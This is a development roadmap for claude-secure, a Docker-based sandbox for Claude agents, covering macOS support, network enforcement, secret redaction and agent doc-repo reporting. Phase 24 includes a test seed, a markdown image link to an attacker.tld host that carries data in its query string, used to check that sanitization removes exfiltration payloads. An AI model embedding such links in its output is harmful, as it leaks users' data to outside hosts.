# Roadmap: claude-secure

## Milestones

- v1.0 MVP -- Phases 1-11 (shipped 2026-04-11)
- v2.0 Headless Agent Mode -- Phases 12-17 (shipped 2026-04-12)
- v3.0 macOS Support -- Phases 18-22 (in progress)
- v4.0 Agent Documentation Layer -- Phases 23-26 (planning)

## Phases

<details>
<summary>v1.0 MVP (Phases 1-11) -- SHIPPED 2026-04-11</summary>

- [x] Phase 1: Docker Infrastructure (2/2 plans) -- completed 2026-04-08
- [x] Phase 2: Call Validation (3/3 plans) -- completed 2026-04-08
- [x] Phase 3: Secret Redaction (2/2 plans) -- completed 2026-04-08
- [x] Phase 4: Installation & Platform (2/2 plans) -- completed 2026-04-08
- [x] Phase 5: Integration Testing (absorbed into per-phase test suites)
- [x] Phase 6: Service Logging (3/3 plans) -- completed 2026-04-09
- [x] Phase 7: Env-file Strategy (2/2 plans) -- completed 2026-04-09
- [x] Phase 8: Container Tooling (1/1 plan) -- completed 2026-04-09
- [x] Phase 9: Multi-Instance Support (3/3 plans) -- completed 2026-04-10
- [x] Phase 10: Automate Pre-push Tests (2/2 plans) -- completed 2026-04-10
- [x] Phase 11: Milestone Cleanup (1/1 plan) -- completed 2026-04-11

</details>

<details>
<summary>v2.0 Headless Agent Mode (Phases 12-17) -- SHIPPED 2026-04-12</summary>

- [x] Phase 12: Profile System (2/2 plans) -- completed 2026-04-11
- [x] Phase 13: Headless CLI Path (3/3 plans) -- completed 2026-04-11
- [x] Phase 14: Webhook Listener (4/4 plans) -- completed 2026-04-12
- [x] Phase 15: Event Handlers (4/4 plans) -- completed 2026-04-12
- [x] Phase 16: Result Channel (4/4 plans) -- completed 2026-04-12
- [x] Phase 17: Operational Hardening (4/4 plans) -- completed 2026-04-12

</details>

### v3.0 macOS Support (In Progress)

- [x] **Phase 18: Platform Abstraction & Bash Portability** - Shared platform detection library and BSD/bash 3.2 portability fixes across all host scripts (completed 2026-04-13)
- [x] **Phase 19: Docker Desktop Compatibility** - Compose topology and validator image work correctly under Docker Desktop on macOS (completed 2026-04-13)
- [ ] **Phase 20: Network Enforcement on macOS** - Empirical spike resolves iptables-vs-pf, then implements network-level call enforcement
- [ ] **Phase 21: launchd Service Management** - Webhook listener and reaper run as LaunchDaemons; installer completes end-to-end on macOS
- [ ] **Phase 22: macOS Integration Tests** - TCP-level block tests and launchd lifecycle tests verify v3.0 against silent-failure modes

### v4.0 Agent Documentation Layer (Planning)

- [x] **Phase 23: Profile ↔ Doc Repo Binding** - Profile schema holds doc repo coordinates and host-only PAT; `init-docs` bootstraps per-project directory layout (completed 2026-04-13)
- [ ] **Phase 24: Multi-File Publish Bundle** - Host-side `publish_docs_bundle` writes standardized reports + INDEX.md as single atomic commit through existing redaction pipeline
- [ ] **Phase 25: Context Read & Read-Only Bind Mount** - Sparse shallow clone of doc repo bind-mounted read-only at `/agent-docs/` so agents can read project context without push access
- [ ] **Phase 26: Stop Hook & Mandatory Reporting** - Stop hook verifies local spool (no network); host-side async shipper pushes reports with jittered backoff, never blocking Claude exit

## Phase Details

### Phase 18: Platform Abstraction & Bash Portability
**Goal**: Every host script can detect its platform and runs reliably on macOS without silent BSD/bash 3.2 misbehavior
**Depends on**: Nothing (first v3.0 phase, foundation for all later phases)
**Requirements**: PLAT-02, PLAT-03, PLAT-04, PORT-01, PORT-02, PORT-03, PORT-04, TEST-01
**Success Criteria** (what must be TRUE):
  1. Any host script can source `lib/platform.sh` and call `detect_platform()` to receive `linux`, `wsl2`, or `macos`; `CLAUDE_SECURE_PLATFORM_OVERRIDE` forces a value for CI mocking
  2. Running the installer on macOS without Homebrew exits with an actionable message naming the missing tool and the exact `brew install` command to run
  3. Installer bootstraps GNU bash, coreutils, and jq via `brew install` before any other macOS step, and refuses to proceed if any are missing afterward
  4. Every host-side script runs cleanly on a fresh macOS shell: GNU coreutils are PATH-shimmed, bash 4+ syntax re-execs into brew bash 5, BSD `uuidgen` output is normalized to lowercase, and no `flock` calls remain
  5. Linux CI exercises the macOS code paths via `CLAUDE_SECURE_PLATFORM_OVERRIDE=macos` and the platform-detection unit tests pass on both real and mocked platforms
**Plans**: 5 plans
  - [x] 18-01-PLAN.md — Wave 0: lib/platform.sh + Phase 18 test scaffolding + Phase 17 mkdir-lock test rewrite (PLAT-02, TEST-01)
  - [x] 18-02-PLAN.md — Wave 1: install.sh macOS Homebrew bootstrap (PLAT-03, PLAT-04)
  - [x] 18-03-PLAN.md — Wave 2: bin/claude-secure + run-tests.sh bash 4+ re-exec prologue (PORT-01, PORT-02)
  - [x] 18-04-PLAN.md — Wave 3: flock removal + uuidgen lowercase normalization (PORT-03, PORT-04)
  - [x] 18-05-PLAN.md — Wave 4: install.sh prologue + final TEST-01 macOS-override sub-suite

### Phase 19: Docker Desktop Compatibility
**Goal**: The existing Docker Compose stack boots and runs the four security layers correctly on Docker Desktop for Mac
**Depends on**: Phase 18
**Requirements**: PLAT-05, COMPAT-01
**Success Criteria** (what must be TRUE):
  1. Installer verifies Docker Desktop ≥ 4.44.3 is installed and running on macOS, and warns or blocks with a clear upgrade message if older
  2. Validator container builds from `python:3.11-slim-bookworm` on all platforms and starts cleanly under Docker Desktop without `iptables who?` errors
  3. A smoke test on macOS confirms the claude container boots, the proxy is reachable, the hook fires, and a call-ID is registered with the validator end-to-end
**Plans**: 3 plans
  - [x] 19-01-PLAN.md — Wave 0: Phase 19 test scaffolding (test-phase19.sh harness + smoke test + docker-version fixtures)
  - [x] 19-02-PLAN.md — Wave 1: COMPAT-01 validator base image pin + iptables_probe() startup helper (parallel to 19-03)
  - [x] 19-03-PLAN.md — Wave 1: PLAT-05 check_docker_desktop_version() in install.sh + real fixture-driven tests (parallel to 19-02)

### Phase 20: Network Enforcement on macOS
**Goal**: Non-whitelisted outbound calls are blocked at the network layer on macOS via the enforcement strategy chosen by the empirical spike
**Depends on**: Phase 19
**Requirements**: ENFORCE-01, ENFORCE-02
**Success Criteria** (what must be TRUE):
  1. A 90-minute empirical spike on real macOS hardware tests iptables inside a Docker Desktop container with `NET_ADMIN` + bridge networking and produces a written decision (Option A: iptables stays in container, Option B: host-side pf, or Option C: proxy chokepoint)
  2. The chosen enforcement implementation is wired into the validator path and self-verifies on startup — a test rule is inserted and confirmed present, failing loudly if the kernel silently drops it
  3. A non-whitelisted domain reached from inside the claude container is rejected at the TCP layer (not just at HTTP), confirming enforcement is real and not a silent bypass
**Plans**: TBD

### Phase 21: launchd Service Management
**Goal**: The webhook listener and container reaper run as boot-persistent LaunchDaemons on macOS, and the installer completes the full claude-secure install path end-to-end
**Depends on**: Phase 20
**Requirements**: PLAT-01, SVC-01, SVC-02, SVC-03, SVC-04
**Success Criteria** (what must be TRUE):
  1. A user runs a single installer command on macOS and ends up with a working claude-secure: containers built, dependencies bootstrapped, daemons loaded, ready to spawn
  2. Webhook listener runs as `com.claude-secure.webhook` LaunchDaemon under `/Library/LaunchDaemons/`, root:wheel 0644, installed via `launchctl bootstrap system` and removed via `launchctl bootout system` (never deprecated `load`/`unload`)
  3. Container reaper runs as `com.claude-secure.reaper` LaunchDaemon and removes orphaned containers on its schedule, replacing the systemd timer used on Linux
  4. If the Phase 20 spike chose host-side pf enforcement, a one-shot `com.claude-secure.pf-loader` LaunchDaemon restores the pf anchor on boot; if pf was not chosen, this daemon is omitted from the install
**Plans**: TBD

### Phase 22: macOS Integration Tests
**Goal**: Automated tests cover the macOS code paths so silent-failure modes are caught before users hit them
**Depends on**: Phase 21
**Requirements**: TEST-02, TEST-03
**Success Criteria** (what must be TRUE):
  1. An integration test attempts a non-whitelisted call from inside the claude container on macOS and asserts the call is blocked at the network layer (TCP reject or HTTP 403, depending on the enforcement choice from Phase 20)
  2. An integration test installs the launchd daemons, verifies they survive a simulated reboot via `launchctl bootout`/`bootstrap` cycle, uninstalls cleanly, and confirms no zombie pf anchors remain on the host (when applicable)
  3. The full v3.0 test suite is added to the pre-push hook test selection so any change touching macOS code paths runs the tests automatically
**Plans**: TBD

### Phase 23: Profile ↔ Doc Repo Binding
**Goal**: Profiles carry doc-repo coordinates and a host-only write PAT, and users can initialize the per-project doc layout with one command — all with zero breakage for existing Phase 16 profiles
**Depends on**: Nothing (first v4.0 phase; extends Phase 12 profile schema)
**Requirements**: BIND-01, BIND-02, BIND-03, DOCS-01
**Success Criteria** (what must be TRUE):
  1. A user can set `docs_repo`, `docs_branch`, and `docs_project_dir` in a profile's `profile.json`, place `DOCS_REPO_TOKEN` in the profile `.env`, and `claude-secure` validates all four fields at spawn time, failing closed with an actionable message when any are missing or malformed
  2. `DOCS_REPO_TOKEN` is present in the host profile `.env` but provably absent from the Claude container environment — a container-side `env` dump contains neither the value nor the variable name
  3. Profiles that still carry legacy `report_repo` / `REPORT_REPO_TOKEN` from Phase 16 continue to resolve correctly: the new fields act as aliases, the old fields are honored if present, and a one-line deprecation warning is logged on first use
  4. Running `claude-secure profile init-docs --profile <name>` in an empty doc repo creates `projects/<slug>/` containing `todo.md`, `architecture.md`, `vision.md`, `ideas.md`, `specs/`, and `reports/INDEX.md` as a single atomic commit, and is idempotent when the layout already exists
**Plans**: 3 plans
  - [x] 23-01-PLAN.md — Wave 0: tests/test-phase23.sh scaffolding + fixture profiles (BIND-01/02/03, DOCS-01 RED stubs)
  - [x] 23-02-PLAN.md — Wave 1: validate_docs_binding + host-only .env projection + legacy alias resolver (BIND-01, BIND-02, BIND-03)
  - [x] 23-03-PLAN.md — Wave 2: do_profile_init_docs subcommand + dispatch + README update (DOCS-01)

### Phase 24: Multi-File Publish Bundle (Outbound Path)
**Goal**: A single host-side call can commit a full agent report plus an INDEX.md update to the doc repo atomically, after running every staged file through secret redaction and markdown sanitization
**Depends on**: Phase 23 (reads profile doc-repo fields)
**Requirements**: DOCS-02, DOCS-03, RPT-01, RPT-02, RPT-03, RPT-04, RPT-05
**Success Criteria** (what must be TRUE):
  1. Calling `publish_docs_bundle` with a rendered report writes it to `projects/<slug>/reports/YYYY/MM/<date>-<session-id>.md` using the mandatory template sections (Goal, Where Worked, What Changed, What Failed, How to Test, Future Findings) and never overwrites an existing file
  2. The same call appends a one-line timestamped entry to `projects/<slug>/reports/INDEX.md` and commits the report file plus the index update as exactly one git commit — a test that injects a failure mid-bundle leaves the working tree clean with no partial commit
  3. Every file staged for that commit is passed through the existing Phase 3 secret redaction pipeline before `git add`, and a test seeding a known secret into the report confirms the secret never reaches the remote
  4. Every staged file is sanitized to strip external image references, raw HTML, and HTML comments before commit, and a test seeding `![](https://attacker.tld/?data=x)` confirms the reference is removed
  5. Push uses `git push` over HTTPS (never `--force`) with 3-attempt jittered retry on non-fast-forward, and a test that races two concurrent publishes produces two commits on `main` with no lost updates
**Plans**: 3 plans
  - [ ] 24-01-PLAN.md — Wave 0: tests/test-phase24.sh + fixtures + canonical bundle.md template (RPT-01 file half)
  - [ ] 24-02-PLAN.md — Wave 1: verify_bundle_sections + sanitize_markdown_file helpers (RPT-01, RPT-04)
  - [ ] 24-03-PLAN.md — Wave 2: publish_docs_bundle main function — composes redact + sanitize + atomic commit + push_with_retry (DOCS-02, DOCS-03, RPT-02, RPT-03, RPT-05)

### Phase 25: Context Read & Read-Only Bind Mount
**Goal**: Agents can read the doc repo's per-project context at spawn time without having any path to push from inside the container
**Depends on**: Phase 23 (needs `docs_project_dir` to know which subtree to clone)
**Requirements**: CTX-01, CTX-02, CTX-03, CTX-04
**Success Criteria** (what must be TRUE):
  1. On spawn, `bin/claude-secure` performs a sparse shallow clone (`--depth=1 --filter=blob:none --sparse`) of the doc repo's `projects/<slug>/` subtree on the host and bind-mounts it read-only into the container at `/agent-docs/`
  2. From inside the container, the agent can successfully `cat /agent-docs/projects/<slug>/todo.md`, `architecture.md`, `vision.md`, `ideas.md`, and files under `specs/`, and a write attempt to any path under `/agent-docs/` fails with a read-only filesystem error
  3. Spawning a profile that has no `docs_repo` configured completes successfully with no clone attempt and no error; logs contain a single info-level line indicating context read was skipped
  4. `/agent-docs/.git/` does not exist inside the container — verified by a test that lists the mount and asserts absence; the host-side clone either uses sparse-checkout to exclude `.git` or copies the checkout into a `.git`-free directory before bind mount
**Plans**: TBD

### Phase 26: Stop Hook & Mandatory Reporting
**Goal**: Every Claude execution guarantees a report reaches the doc repo — enforced by a local-spool Stop hook that cannot be blocked by network failures, with a host-side shipper handling the actual push
**Depends on**: Phase 24 (publish bundle must exist), Phase 25 (bind mount must exist)
**Requirements**: SPOOL-01, SPOOL-02, SPOOL-03
**Success Criteria** (what must be TRUE):
  1. A Claude session that exits without writing a report spool file triggers the Stop hook to re-prompt Claude exactly once to produce the report; a session that already wrote the spool exits cleanly with zero re-prompts
  2. The Stop hook makes zero network calls — a test that fails DNS resolution for the doc repo host asserts Claude still exits within 5 seconds of the Stop hook firing, with the spool file written and queued for shipping
  3. After Claude exits, the host-side async shipper reads the spool, calls `publish_docs_bundle`, and on success deletes the spool; on failure it logs the error with retry counter to the audit JSONL and schedules a jittered retry, and a subsequent failing shipper run never blocks a new `claude-secure spawn`
  4. The Stop hook's `stop_hook_active` guard prevents recursive re-prompting: a test that seeds a broken report template confirms the hook re-prompts once, then yields without looping, even if the second attempt still fails
**Plans**: TBD
**Research flag**: Stop hook API field names (`stop_hook_active`, re-prompt semantics) must be re-verified with Context7 at plan time — API is version-sensitive.

## Progress

**Execution Order:**
- v3.0 phases execute strictly in numeric order: 18 -> 19 -> 20 -> 21 -> 22
  (Phase 20 is gated on Phase 19's Docker Desktop smoke test; Phase 21 cannot start until Phase 20 commits to an enforcement option.)
- v4.0 phases: 23 and 24 may run in parallel (neither depends on the other). 25 depends on 23. 26 depends on 24 and 25. Suggested order: 23 -> 24 -> 25 -> 26, or 23+24 parallel then 25 then 26.

| Phase | Milestone | Plans Complete | Status | Completed |
|-------|-----------|----------------|--------|-----------|
| 1. Docker Infrastructure | v1.0 | 2/2 | Complete | 2026-04-08 |
| 2. Call Validation | v1.0 | 3/3 | Complete | 2026-04-08 |
| 3. Secret Redaction | v1.0 | 2/2 | Complete | 2026-04-08 |
| 4. Installation & Platform | v1.0 | 2/2 | Complete | 2026-04-08 |
| 5. Integration Testing | v1.0 | 0/0 | Complete (per-phase) | 2026-04-08 |
| 6. Service Logging | v1.0 | 3/3 | Complete | 2026-04-09 |
| 7. Env-file Strategy | v1.0 | 2/2 | Complete | 2026-04-09 |
| 8. Container Tooling | v1.0 | 1/1 | Complete | 2026-04-09 |
| 9. Multi-Instance Support | v1.0 | 3/3 | Complete | 2026-04-10 |
| 10. Automate Pre-push Tests | v1.0 | 2/2 | Complete | 2026-04-10 |
| 11. Milestone Cleanup | v1.0 | 1/1 | Complete | 2026-04-11 |
| 12. Profile System | v2.0 | 2/2 | Complete | 2026-04-11 |
| 13. Headless CLI Path | v2.0 | 3/3 | Complete | 2026-04-11 |
| 14. Webhook Listener | v2.0 | 4/4 | Complete | 2026-04-12 |
| 15. Event Handlers | v2.0 | 4/4 | Complete | 2026-04-12 |
| 16. Result Channel | v2.0 | 4/4 | Complete | 2026-04-12 |
| 17. Operational Hardening | v2.0 | 4/4 | Complete | 2026-04-12 |
| 18. Platform Abstraction & Bash Portability | v3.0 | 5/5 | Complete    | 2026-04-13 |
| 19. Docker Desktop Compatibility | v3.0 | 3/3 | Complete   | 2026-04-13 |
| 20. Network Enforcement on macOS | v3.0 | 0/0 | Not started | - |
| 21. launchd Service Management | v3.0 | 0/0 | Not started | - |
| 22. macOS Integration Tests | v3.0 | 0/0 | Not started | - |
| 23. Profile ↔ Doc Repo Binding | v4.0 | 3/3 | Complete   | 2026-04-13 |
| 24. Multi-File Publish Bundle | v4.0 | 0/3 | Planned     | -          |
| 25. Context Read & Bind Mount | v4.0 | 0/0 | Not started | - |
| 26. Stop Hook & Mandatory Reporting | v4.0 | 0/0 | Not started | - |
